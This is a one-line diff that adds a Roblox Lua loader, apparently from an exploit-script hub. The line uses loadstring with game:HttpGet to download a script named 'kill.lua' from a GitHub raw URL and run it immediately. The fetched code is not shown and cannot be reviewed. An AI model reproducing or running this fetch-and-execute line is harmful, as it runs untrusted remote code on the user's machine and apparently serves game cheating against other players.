@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xqrto/Roblox-ZentroHub/refs/heads/main/Dbug/kill.lua"))()
